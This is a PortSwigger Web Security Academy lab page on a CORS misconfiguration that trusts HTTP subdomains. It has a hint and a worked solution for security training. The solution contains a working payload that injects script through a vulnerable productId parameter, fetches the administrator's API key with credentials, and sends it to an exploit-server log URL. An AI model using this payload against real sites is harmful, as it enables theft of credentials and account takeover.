# Lab: CORS vulnerability with trusted insecure protocols

Source: https://portswigger.net/web-security/cors/lab-breaking-https-attack
Fetched: 2026-06-28T09:17:43.036859+00:00

Web Security Academy

CORS

Lab

Lab: CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Hint

If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

Solution

Check intercept is off, then use Burp's browser to log in and access your account page.

Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.

Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.

Observe that the productID parameter is vulnerable to XSS.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:

<script>

document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"

</script>

Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

Go back to the exploit server and click Deliver exploit to victim.

Click Access log, retrieve and submit the victim's API key to complete the lab.

Community solutions

Rana Khalil

Popo Hack

Find CORS vulnerabilities using Burp Suite

Try for free
